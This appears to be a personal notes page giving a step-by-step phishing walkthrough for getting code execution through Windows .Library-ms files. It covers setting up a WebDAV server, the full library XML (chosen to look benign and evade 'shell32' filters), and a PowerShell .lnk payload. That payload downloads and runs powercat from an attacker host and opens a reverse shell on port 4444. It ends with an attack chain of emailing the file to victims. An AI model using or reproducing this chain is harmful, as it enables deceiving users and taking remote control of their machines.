---
layout: default
---
# Obtaining Code Execution via Windows Library Files

Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.

we'll create a Windows library file connecting to a WebDAV1 share we'll set up. In the first stage, the victim receives a .Library-ms file, perhaps via email. When they double-click the file, it will appear as a regular directory in Windows Explorer. In the WebDAV directory, we'll provide a payload in the form of a .lnk shortcut file for the second stage to execute a PowerShell reverse shell. We must convince the user to double-click our .lnk payload file to execute it.

```
kali@kali:~$ pip3 install wsgidav

kali@kali:~$ apt install python3-wsgidav
```
>> If the installation of WsgiDAV fails with error: externally-managed-environment, we can use a virtual environment3 or install the package python3-wsgidav with apt. In PEP 668,4 a change was introduced to enforce the use of virtual environments and prevent situations in which package installations via pip break the operating system.


```
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
* * *
* * *
let's create the Windows library file

Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are General library information, Library properties, and Library locations

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">


</libraryDescription>
```

The name9 tag specifies the name of this library. We must not confuse this with an arbitrary name we can just set randomly. We need to specify the name of the library by providing a DLL name and index. We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. We'll use the latter to avoid any issues with text-based filters that may flag on "shell32". The version10 tag can be set to a numerical value of our choice, for example, 6.

```
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
we'll add the isLibraryPinned11 tag. This element specifies if the library is pinned to the navigation pane in Windows Explorer. For our targets, this may be another small detail to make the whole process feel more genuine and therefore, we'll set it to true. The next tag we'll add is iconReference,12 which determines what icon is used to display the library file. We must specify the value in the same format as the name element. We can use imagesres.dll to choose between all Windows icons. We can use index "-1002" for the Documents folder icon from the user home directories or "-1003" for the Pictures folder icon. We'll provide the latter to make it look more benign.

```
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```
 let's add the templateInfo13 tags, which contain the folderType14 tags. These tags determine the columns and details that appear in Windows Explorer by default after opening the library. We'll need to specify a GUID that we can look up on the Microsoft documentation15 webpage. For this example, we'll use the Documents GUID to appear as convincing as possible for the victim.

```
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
The next tag marks the beginning of the library locations section. In this section, we specify the storage location where our library file should point to. We'll begin by creating the searchConnectorDescriptionList,16 tag which contains a list of search connectors17 defined by searchConnectorDescription.18 Search connectors are used by library files to specify the connection settings to a remote location. We can specify one or more searchConnectorDescription elements inside the searchConnectorDescriptionList tags. For this example we only specify one.

Inside the description of the search connector, we'll specify information and parameters for our WebDAV share. The first tag we'll add is the isDefaultSaveLocation19 tag with the value set to true. This tag determines the behavior of Windows Explorer when a user chooses to save an item. To use the default behavior and location, we'll set it to true. Next, we'll add the isSupported tag, which is not documented in the Microsoft Documentation webpage, and is used for compatibility. We can set it to false.

The most important tag is url,20 which we need to point to our previously-created WebDAV share over HTTP. It is contained within the simpleLocation21 tags, which we can use to specify the remote location in a more user-friendly way as the normal locationProvider22 element.

```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<ip></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```
The Entire XML  we will save it as config.Library-ms

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<ip></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

we'll need to create the shortcut file. The goal is to start a reverse shell by putting the .lnk shortcut file on the WebDAV share for the victim to execute.

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:8000/powercat.ps1');
powercat -c <ip> -p 4444 -e powershell"
```

put the .lnk and config.Library-ms in webdav dir 

* * *
* * *
## ATTACK CHAIN

* send config.library-ms via mail or smb
* user click on the file and execute the rev shell by executing our .lnk file
